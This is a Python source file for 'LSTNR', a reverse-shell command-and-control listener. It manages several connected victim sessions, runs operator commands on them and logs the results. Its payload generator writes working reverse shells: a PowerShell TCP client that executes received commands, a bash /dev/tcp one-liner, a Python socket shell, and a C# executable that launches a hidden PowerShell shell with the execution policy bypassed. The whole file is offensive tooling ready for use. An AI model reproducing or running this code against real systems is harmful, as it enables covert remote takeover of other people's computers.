import sys
import threading
import socket
import time
import readline
import os
import re
import subprocess
from collections import defaultdict
import select

# colors
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
ORANGE = "\033[93m"
BLUE = "\033[94m"

clients = {}
selected_client = None
client_id_counter = 1
client_threads = {}
prompt_mode = "main"

MAIN_COMMANDS = ["list ", "select ", "payload ", "exit ", "help ", "kill "]
SESSION_COMMANDS = ["background ", "die "]
PAYLOAD_COMMANDS = ["set ", "generate ", "back ", "options ", "help "]

payload_settings = {
    "name": None,
    "lhost": "127.0.0.1",
    "lport": "80",
    "payload": "sh"
}

# session log directory
LOG_DIR = "session_logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def log_to_file(client_id, ip, content, direction="send"):
    filename = f"{client_id}_{ip}.log"
    path = os.path.join(LOG_DIR, filename)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    prefix = "[SEND]" if direction == "send" else "[RECV]"
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} {prefix} {content}\n")

def format_table(data, headers):
    # box characters
    top_left = '╔'
    top_mid = '╦'
    top_right = '╗'
    mid_left = '╠'
    mid_mid = '╬'
    mid_right = '╣'
    bottom_left = '╚'
    bottom_mid = '╩'
    bottom_right = '╝'
    horizontal = '═'
    vertical = '║'

    # get column widths
    col_widths = [max(len(header), max(len(row[i]) for row in data)) for i, header in enumerate(headers)]

    def make_row(values):
        return vertical + " " + f" {vertical} ".join(f"{str(v).ljust(col_widths[i])}" for i, v in enumerate(values)) + " " + vertical

    def make_border(left, mid, right):
        return left + mid.join(horizontal * (w + 2) for w in col_widths) + right

    top = make_border(top_left, top_mid, top_right)
    divider = make_border(mid_left, mid_mid, mid_right)
    bottom = make_border(bottom_left, bottom_mid, bottom_right)
    header_row = make_row(headers)
    body = "\n".join(make_row(row) for row in data)

    return "\n".join([top, header_row, divider, body, bottom])

def clean_output(data, user="Unknown"):
    
    lines = data.splitlines()
    cleaned_lines = []
    for line in lines:
        if re.match(r"(?i)^ps [a-z]:\\.*>$", line.strip()):
            continue
        # remove bash/sh/python prompts: "$ " or "# "
        if line.strip() in ("$", "#"):
            continue
        cleaned_lines.append(line)
    return "\n".join(cleaned_lines)


def client_handler(conn, addr, client_id):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            if selected_client == client_id:
                decoded_data = data.decode(errors="ignore")
                if decoded_data.strip():
                    sys.stdout.write(decoded_data)
                    sys.stdout.flush()
                    log_to_file(client_id, clients[client_id]["ip"], decoded_data, direction="recv")
    except Exception:
        pass
    finally:
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except:
            pass
        conn.close()
        clients.pop(client_id, None)
        client_threads.pop(client_id, None)

def live_shell(conn):
    try:
        while True:
            sockets = [conn, sys.stdin]
            rlist, _, _ = select.select(sockets, [], [])
            for sock in rlist:
                if sock == conn:
                    data = conn.recv(4096)
                    if not data:
                        return
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
                elif sock == sys.stdin:
                    user_input = sys.stdin.readline()
                    if not user_input:
                        return
                    conn.sendall(user_input.encode())
    except KeyboardInterrupt:
        print(f"\n{ORANGE}[*] Exiting live shell...{RESET}")


def start_LSTNR(host, port):
    global client_id_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"Listening on {host}:{port}...")
    
    def accept_connections():
        nonlocal server
        global client_id_counter
        while True:
            conn, addr = server.accept()
            client_id = client_id_counter
            clients[client_id] = {"conn": conn, "ip": addr[0], "hostname": "Unknown", "user": "Unknown"}
            client_thread = threading.Thread(target=client_handler, args=(conn, addr, client_id), daemon=True)
            client_threads[client_id] = client_thread
            client_thread.start()
            client_id_counter += 1

    threading.Thread(target=accept_connections, daemon=True).start()


def complete(text, state):
    options = []
    if prompt_mode == "main":
        options = [cmd for cmd in MAIN_COMMANDS if cmd.startswith(text)]
    elif prompt_mode == "session":
        options = [cmd for cmd in SESSION_COMMANDS if cmd.startswith(text)]
    elif prompt_mode == "payload":
        options = [cmd for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

readline.set_completer_delims(' \t\n')
readline.parse_and_bind("tab: complete")
readline.set_completer(complete)

def cli():
    global selected_client, prompt_mode
    print(f"""
{BLUE}
██╗     ███████╗████████╗███╗   ██╗██████╗ 
██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
███████╗███████║   ██║   ██║ ╚████║██║  ██║
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
{RESET}
""")
    while True:
        try:
            if not selected_client:
                prompt_mode = "main"
                cmd = input(f"{BLUE}LSTNR>{RESET} ").strip()
                if not cmd:
                    continue
                if cmd == "exit":
                    break
                elif cmd == "help":
                    show_help()
                elif cmd == "list":
                    list_clients()
                elif cmd.startswith("select "):
                    select_client(cmd)
                elif cmd == "payload":
                    payload_menu()
                elif cmd.startswith("kill "):
                    kill_client(cmd)
            else:
                prompt_mode = "session"
                conn = clients[selected_client]["conn"]
                cmd = input("").strip()
                if not cmd:
                    continue
                elif cmd == "interact":
                    print(f"{ORANGE}[*] Entering live session. Ctrl+C to return.{RESET}")
                    live_shell(conn)
                if cmd == "background":
                    print(f"{ORANGE}[*] Session background.{RESET}")
                    selected_client = None
                    time.sleep(0.1)
                elif cmd == "die":
                    try:
                        conn.sendall(b"__exit__")
                    except:
                        pass
                    try:
                        conn.shutdown(socket.SHUT_RDWR)
                    except:
                        pass
                    conn.close()
                    del clients[selected_client]
                    client_threads.pop(selected_client, None)
                    print(f"{ORANGE}[*] Client Terminated{RESET}")
                    selected_client = None
                    time.sleep(0.1)
                else:
                    conn.sendall(cmd.encode() + b"\n")
                    log_to_file(selected_client, clients[selected_client]["ip"], cmd, direction="send")
        except KeyboardInterrupt:
            print(f"\n{ORANGE}[*] Use 'background' to leave a session.{RESET}")
            print(f"\n{ORANGE}[*] Use 'exit' to shut down the LSTNR cleanly.{RESET}")
        except Exception:
            continue

def show_help():
    print(f"""
{ORANGE}Menu commands:{RESET}
    list                - List sessions
    select <id>         - Connect to a session by its ID
    payload             - Payload generation menu
    kill <id>           - Terminate specific session
    exit                - Terminate all sessions and exit LSTNR
{ORANGE}Session commands:{RESET}
    <any command>       - Execute command on client
    background          - Return to main menu
    die                 - Terminate current session
{ORANGE}Payload Menu Commands:{RESET}
    set name <name>     - Custom name for reverse shell
    set lhost <ip>      - Set the LSTNR IP address
    set lport <port>    - Set the LSTNR listening port
    set payload <type>  - Set payload type (EX: py, sh, ps1, exe)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu
""")


def update_client_info_from_logs():
    for cid, client in clients.items():
        filename = f"{cid}_{client['ip']}.log"
        path = os.path.join(LOG_DIR, filename)
        if not os.path.exists(path):
            continue

        last_user = "Unknown"
        last_host = "Unknown"
        pending_cmd = None

        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if "[SEND]" in line:
                    if "whoami" in line.lower():
                        pending_cmd = "whoami"
                    elif "hostname" in line.lower():
                        pending_cmd = "hostname"
                    else:
                        pending_cmd = None
                elif "[RECV]" in line and pending_cmd:
                    match = re.search(r"\[RECV\]\s+(.*)", line)
                    if match:
                        result = match.group(1).strip()
                        if pending_cmd == "whoami":
                            last_user = result
                        elif pending_cmd == "hostname":
                            last_host = result
                        pending_cmd = None
        clients[cid]["user"] = last_user
        clients[cid]["hostname"] = last_host


def list_clients():
    if not clients:
        print(f"{RED}[!] No clients connected.{RESET}")
        return

    update_client_info_from_logs()

    headers = ["ID", "IP", "USER", "HOSTNAME"]
    data = []

    for cid, c in clients.items():
        user = c["user"]
        data.append([str(cid), c["ip"], user, c["hostname"]])
    print(format_table(data, headers))


def select_client(cmd):
    global selected_client
    try:
        client_id = int(cmd.split()[1])
        if client_id in clients:
            selected_client = client_id
            print(f"{ORANGE}[*] Client {client_id} selected.{RESET}")
        else:
            print(f"{ORANGE}[!] Invalid client ID.{RESET}")
    except (IndexError, ValueError):
        print(f"{ORANGE}[*] Usage: select <client_id>{RESET}")

def kill_client(cmd):
    try:
        client_id = int(cmd.split()[1])
        if client_id in clients:
            try:
                clients[client_id]["conn"].sendall(b"__exit__")
            except:
                pass
            try:
                clients[client_id]["conn"].shutdown(socket.SHUT_RDWR)
            except:
                pass
            clients[client_id]["conn"].close()
            del clients[client_id]
            client_threads.pop(client_id, None)
            print(f"{ORANGE}[*] Client {client_id} terminated.{RESET}")
        else:
            print(f"{ORANGE}[*] Invalid client ID.{RESET}")
    except (IndexError, ValueError):
        print(f"{ORANGE}[*] Usage: kill <client_id>{RESET}")

def payload_menu():
    global payload_settings, prompt_mode
    prompt_mode = "payload"
    while True:
        try:
            cmd = input(f"{RED}payload>{RESET} ").strip()
            if not cmd:
                continue
            if cmd == "back":
                print()
                break
            elif cmd == "help":
                payload_help()
            elif cmd.startswith("set"):
                handle_payload_set(cmd)
            elif cmd == "options":
                show_payload_options()
            elif cmd == "generate":
                generate_payload()
        except KeyboardInterrupt:
            break

def handle_payload_set(cmd):
    parts = cmd.split()
    if len(parts) == 3:
        key, value = parts[1], parts[2]
        if key in payload_settings:
            payload_settings[key] = value
            print(f"{ORANGE}[*] Set {key} to '{value}'{RESET}")
        else:
            print(f"{ORANGE}[*] Invalid setting: '{key}'{RESET}")
    else:
        print(f"{ORANGE}[*] Usage: set <key> <value>{RESET}")

def show_payload_options():
    #print(f"{ORANGE}\nCurrent Payload Settings:{RESET}")
    headers = ["Setting", "Value"]
    data = []
    for key, value in payload_settings.items():
        display_value = value if value is not None else "Default"
        data.append([key, display_value])
    print(format_table(data, headers))


def generate_payload():
    name = payload_settings.get("name")
    lhost = payload_settings["lhost"]
    lport = payload_settings["lport"]
    payload_type = payload_settings["payload"].strip().lower()
    #print("\n")
    payload_map = {
        "ps1": (
            "ps1",
            f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();"""
        ),
        "sh": (
            "sh",
            f"""/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"""
        ),
        "py": (
            "py",
            f"""import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])"""
        ),
        "exe": (
            "cs",
            f"""using System;
using System.Diagnostics;
using System.IO;

public class ReverseShell {{
    public static void Main() {{
        string psFile = "caller.ps1";
        string psScript = @"
$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
";

        try {{
            File.WriteAllText(psFile, psScript);
            Process.Start(new ProcessStartInfo {{
                FileName = "powershell.exe",
                Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File " + psFile,
                CreateNoWindow = true,
                UseShellExecute = false
            }});
        }} catch (Exception) {{}}
    }}
}}"""
        )
    }

    if payload_type not in payload_map:
        print(f"{RED}[!] Unknown payload type: {payload_type}{RESET}")
        return

    extension, payload_code = payload_map[payload_type]
    filename = f"{name or f'{lhost}_{lport}'}.{extension}"
    print(f"{GREEN}[+] Payload generated: {filename}{RESET}")

    if os.path.exists(filename):
        print(f"{RED}[!] Warning: Overwriting existing file '{filename}'{RESET}")

    try:
        with open(filename, "w") as f:
            f.write(payload_code.strip() + "\n")
        #print(f"{GREEN}[+] Payload source saved as '{filename}'{RESET}")

        if payload_type == "exe":
            exe_name = f"{name or f'{lhost}_{lport}'}.exe"
            result = subprocess.run(["mcs", "-out:" + exe_name, filename], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{RED}[!] Compilation failed:\n{result.stderr}{RESET}")
            else:
                print(f"{GREEN}[+] EXE payload compiled successfully as '{exe_name}'{RESET}")
                try:
                    os.remove(filename)
                    #print(f"{GREEN}[+] Removed source file '{filename}' after successful compilation.{RESET}")
                except Exception as e:
                    print(f"{ORANGE}[!] Compiled, but failed to remove source file: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Failed to write payload: '{e}'{RESET}")


def payload_help():
    print(f"""
{ORANGE}Payload Menu Commands:{RESET}
    set name <name>     - Custom name for reverse shell
    set lhost <ip>      - Set the LSTNR IP address
    set lport <port>    - Set the LSTNR listening port
    set payload <type>  - Set payload type (EX: py, sh, ps1, exe)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu
""")

if __name__ == "__main__":
    if len(sys.argv) == 3 and sys.argv[1] in ("-p", "--port"):
        try:
            port = int(sys.argv[2])
            start_LSTNR("0.0.0.0", port)
            cli()
        except ValueError:
            print(f"{RED}[!] Port must be an integer.{RESET}")
    else:
        print(f"{ORANGE}[!] Usage: python3 lstnr.py -p <port>{RESET}")
